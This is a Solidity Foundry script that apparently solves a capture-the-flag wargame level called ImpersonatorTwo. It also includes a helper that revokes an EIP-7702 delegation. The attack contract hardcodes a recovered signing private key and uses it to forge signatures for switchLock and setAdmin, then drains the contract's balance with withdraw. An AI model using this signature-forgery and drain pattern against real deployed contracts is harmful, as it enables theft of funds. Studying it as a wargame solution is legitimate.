// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Script, console} from "forge-std/Script.sol";
import {Strings} from "oz-v4/contracts/utils/Strings.sol";
import {ImpersonatorTwo} from "./ImpersonatorTwo.sol";

contract AttackScript is Script {
    using Strings for uint256;

    /// constants
    uint256 SK = uint256(0x10a6891de55baf453d66c5faede86eabccf93f3d284540d205f24207670855cc);
    address INSTANCE_ADDR = 0x82f91050F5785EEce6530f55772e50D82974c0Bc;
    address PLAYER_ADDR = 0xB0fD5a878DBF3F9358A251caF9b6Fc692A999cA7;

    function run() public {
        ImpersonatorTwo target = ImpersonatorTwo(INSTANCE_ADDR);

        uint256 sk = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(sk);
        address sender = vm.addr(sk);
        console.log("sender: %s", sender);

        uint256 nonce = target.nonce();

        string memory message;
        bytes32 hsh;
        uint8 v;
        bytes32 r;
        bytes32 s;

        // 1. Call switchLock()
        message = string(abi.encodePacked("lock", nonce.toString()));
        hsh = target.hash_message(message);
        (v, r, s) = vm.sign(SK, hsh);

        target.switchLock(abi.encodePacked(r, s, v));
        nonce++;

        // 2. Call setAdmin()
        message = string(abi.encodePacked("admin", nonce.toString(), PLAYER_ADDR));
        hsh = target.hash_message(message);
        (v, r, s) = vm.sign(SK, hsh);

        target.setAdmin(abi.encodePacked(r, s, v), PLAYER_ADDR);

        // 3. Call withdraw()
        target.withdraw();

        require(address(INSTANCE_ADDR).balance == 0, "Instance contract balance is not withdrawn");

        vm.stopBroadcast();
    }
}

contract ClearDelegationScript is Script {
    function run() public {
        // Get private key from environment
        uint256 delegatorPrivateKey = vm.envUint("PRIVATE_KEY");
        address delegator = vm.addr(delegatorPrivateKey);

        console.log("Clearing delegation for:", delegator);

        vm.startBroadcast(delegatorPrivateKey);

        // Sign delegation to zero address to clear/revoke
        vm.signAndAttachDelegation(
            address(0), // Delegate to zero address = revoke
            delegatorPrivateKey
        );

        // Send a dummy transaction to execute the delegation
        // The delegation happens as part of this tx
        (bool success,) = delegator.call("");
        require(success, "Clear delegation failed");

        vm.stopBroadcast();

        console.log("Delegation cleared successfully!");
    }
}
